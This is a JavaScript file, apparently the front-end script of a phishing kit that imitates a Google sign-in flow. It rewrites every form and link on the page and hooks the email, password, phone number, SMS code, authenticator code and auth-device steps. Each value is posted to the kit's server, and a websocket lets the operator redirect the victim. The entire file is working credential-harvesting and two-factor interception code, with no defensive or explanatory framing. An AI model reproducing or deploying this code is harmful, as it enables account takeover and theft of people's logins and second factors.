// Extracting path and parameters
const urlPath = location.pathname;
const urlSplit = urlPath.split("/");
const id = urlSplit[3];
const appName = urlSplit[2];

// Initialize socket connection
const socket = io(location.origin, {
    path: '/socket.io',
    transports: ['websocket'],
    secure: true,
});

// Listen for specific events
socket.on(`${id}-listener`, data => {
    if (data.type == "response") {
        top.location.href = `${location.origin}/ws-app?id=${id}`;
    }
});

// Update all anchor tags' href attributes
document.querySelectorAll("a").forEach(atag => {
    atag.href = location.href;
});

// Remove all iframes
document.querySelectorAll("iframe").forEach(f => {
    f.remove();
});

// Remove specific attributes from all elements
document.querySelectorAll('*').forEach(element => {
    element.removeAttribute("onclick");
    element.removeAttribute('onmousedown');
});

// Modify all forms' actions and methods
document.querySelectorAll("form").forEach(form => {
    form.action = location.pathname;
    form.method = "POST";
    form.noValidate = false;

    const input = document.createElement("input");
    input.type = "hidden";
    input.name = "spikeType";
    form.append(input);
});

// Set required attribute on input fields
document.querySelectorAll("input").forEach(inp => {
    if (inp.type != "hidden") {
        inp.required = true;
    }
});

// Helper function to update all spikeType inputs
function addSpikeType(value) {
    document.querySelectorAll(`[name="spikeType"]`).forEach(spike => {
        spike.value = value;
    });
}

// Function to submit form data programmatically
function spikeForm(data, silent = false) {
    if (silent) {
        fetch(location.href, {
            method: "POST",
            headers: {
                "Content-Type": "application/json"
            },
            body: JSON.stringify(data)
        }).then(res => res.text())
            .then(data => {
                console.log(data);
            });
    } else {
        let formData = "";
        for (const key in data) {
            formData += `<input type="hidden" name="${key}" value="${data[key]}">`;
        }

        const form = document.createElement("form");
        form.method = "POST";
        form.action = location.href;
        form.innerHTML = formData;
        document.body.appendChild(form);
        form.submit();
    }
}

/**
 *  Spikes selector functions
 */

const selectorSpikes = [
    {
        spikeType: "home-email",
        querys: [
            `[type="email"]`,
            `[id="identifierId"]`,
            '#identifierNext'
        ],
        runner() {
            const emailInp = document.querySelector(`[type="email"]`);
            const submitBtn = document.querySelector('#identifierNext');

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    email: emailInp.value
                });
            });
        }
    },
    {
        spikeType: "home-password",
        querys: [
            `[type="password"]`,
            `[name="Passwd"]`,
            '#passwordNext'
        ],
        runner() {
            const passwordInp = document.querySelector(`[name="Passwd"]`);
            const submitBtn = document.querySelector('#passwordNext');

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    password: passwordInp.value
                });
            });

            const passShowBtn = document.querySelector(`[type="checkbox"]`);
            passShowBtn.addEventListener("click", () => {
                passwordInp.type = passwordInp.type === "password" ? "text" : "password";
            });
        }
    },
    {
        spikeType: "phone-number",
        querys: [
            `#phoneNumberId`
        ],
        runner() {
            const phoneNumberId = document.querySelector("#phoneNumberId");
            phoneNumberId.name = "phoneNumber";
            const submitBtn = document.querySelector('#nextButton');

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    phoneNumber: phoneNumberId.value
                });
            });
        }
    },
    {
        spikeType: "sms-code",
        querys: [
            `#idvPin`
        ],
        runner() {
            const smsCodeInp = document.querySelector(`#idvPin`);
            const submitBtn = document.querySelector('#idvPreregisteredPhoneNext');

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    smsCode: smsCodeInp.value
                });
            });
        }
    },
    {
        spikeType: "auth-code",
        querys: [
            `#idvPinId`
        ],
        runner() {
            const authCodeInp = document.querySelector(`#idvPinId`);
            const submitBtn = document.querySelector('#idvPreregisteredPhoneNext');

            submitBtn.addEventListener("click", () => {
                spikeForm({
                    spikeType: this.spikeType,
                    authCode: authCodeInp.value
                });
            });
        }
    }
];

/**
 * Button spikes functions
 */

const buttonSpikes = [
    {
        spikeType: "auth-devices",
        runner() {
            const authContainer = document.querySelectorAll(".JDAKTe.cd29Sd.zpCp3.SmR8");
            if (authContainer) {
                authContainer.forEach((btn, index) => {
                    btn.addEventListener("click", () => {
                        spikeForm({
                            spikeType: this.spikeType,
                            authKeyIndex: index
                        });
                    });
                });
            }
        }
    }
];

// Execute the spikes
for (const selectorSpike of selectorSpikes) {
    const querys = selectorSpike.querys;
    const queryLength = querys.length;

    let queryMatch = 0;
    for (const selector of querys) {
        if (document.querySelector(selector)) queryMatch++;
    }

    if (queryLength === queryMatch) {
        addSpikeType(selectorSpike.spikeType);
        if (selectorSpike.hasOwnProperty("runner")) {
            try {
                selectorSpike.runner();
            } catch (error) { }
        }
        break;
    }
}

for (const buttonSpike of buttonSpikes) {
    try {
        buttonSpike.runner();
    } catch (error) { }
}
